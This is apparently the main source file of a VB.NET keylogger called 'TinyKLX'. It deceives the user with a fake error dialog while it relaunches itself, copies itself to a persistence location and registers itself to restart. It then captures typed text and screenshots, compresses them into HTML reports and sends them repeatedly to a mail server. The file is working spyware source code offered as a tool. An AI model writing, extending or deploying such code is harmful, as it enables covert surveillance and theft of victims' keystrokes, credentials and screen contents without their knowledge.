Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Windows.Forms

Module Program

	Private Captur As New Capture(Config.CaptureHeight) With {.Quality = Config.CaptureQuality}
	Private Logger As ActivityLogger
	Private PreTex As String
	Private ProTex As String

	Private Sub Init()
		Dim txt = Split(My.Resources.view, "//===SPLIT_ME===\\")
		PreTex = txt(0)
		ProTex = txt(1)
		ServicePointManager.SecurityProtocol = 48 Or 192 Or 768 Or 3072
		Logger = New ActivityLogger(Captur)
	End Sub

	''' <summary>
	''' Initializing TinyKLX
	''' </summary>
	Sub Main(ParamArray args() As String)
		Utils.Log("Starting...")
#If Not DEBUG Then
		If args.Length <> 1 OrElse args(0) <> Config.SafeCommand Then
			Dim appPath = Application.ExecutablePath
			Using p = Process.Start(appPath, Config.SafeCommand)
			End Using
			MessageBox.Show(Config.UserErrorMessage, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End
		End If
		'Check for Antivirus
		'
		'End Check for Antivirus
		Dim newPath = Persistance.PathCheck()
		If newPath IsNot Nothing Then
			Try
				File.Copy(Application.ExecutablePath, newPath, True)
			Catch ex As Exception
				End 'Already Running
			End Try
			Using p = Process.Start(newPath, Config.SafeCommand)
			End Using
			End
		End If
		Persistance.RegOnce()
#End If
#If _MyType = "Console" Then
		Console.Title = "TinyKLX"
		Utils.Async(AddressOf StatusUpdate)
#End If
		Init()
		Logger.Pack()
		'Utils.Async(AddressOf Network.VerifyConnection)
		Utils.Async(AddressOf PackAndSend)
		Application.Run()
	End Sub

	''' <summary>
	''' Packs when data is ready and sends it to mail server
	''' </summary>
	Private Sub PackAndSend()
		Dim watch As New Stopwatch
		While True
			Utils.WaitFor(Function() Logger.Count >= Config.MaxEvents)
			Dim fileName = Now.ToString("yyyy_MM_dd_HH_mm_ss_fff") + ".html.gz"
			Dim pack = Logger.Pack()
			Dim output = Render(pack)
			Utils.Log("Eventing File: " + fileName + "; " + output.Length.ToString() + " bytes")
			watch.Restart()
			Network.Send(fileName, output)
			watch.Stop()
			Utils.Log("File Transmitted: " + fileName + "; in " + watch.Elapsed.ToString())
		End While
	End Sub

	''' <summary>
	''' Converts User action array to compressed HTML
	''' </summary>
	''' <param name="pack"></param>
	''' <returns></returns>
	Private Function Render(pack As UserActivity()) As Byte()
		Using output = New MemoryStream()
			Using compressor = New GZipStream(output, CompressionMode.Compress),
			writer = New StreamWriter(compressor)

				writer.Write(PreTex)

				Dim w = Stopwatch.StartNew()

				Dim imgs(pack.Length - 1) As String
				Parallel.For(0, pack.Length - 1, Sub(i) imgs(i) = Convert.ToBase64String(pack(i).Shot))

				w.Stop()
				Utils.Log("Base64 Conversion: " + w.Elapsed.ToString())

				w.Restart()

				For i = 0 To pack.Length - 1
					Dim item = pack(i)
					If i <> 0 Then
						writer.Write(",")
					End If
					writer.Write("{time:'" + item.Time.ToString())
					writer.Write("',type:'" + item.Info)
					writer.Write("',txt:'" + item.Text.Replace("'", "\'").Replace("\", "\\"))
					writer.Write("',img:'" + imgs(i))
					writer.Write("'}")
				Next

				w.Stop()
				Utils.Log("Rendering time: " + w.Elapsed.ToString())

				writer.Write(ProTex)
			End Using
			Return output.ToArray()
		End Using
	End Function

	Private Sub StatusUpdate()
		While True
			Thread.Sleep(60000)
			Utils.Log("Events Captured: " + Logger.Count.ToString() + " out of " + Config.MaxEvents.ToString())
		End While
	End Sub

End Module
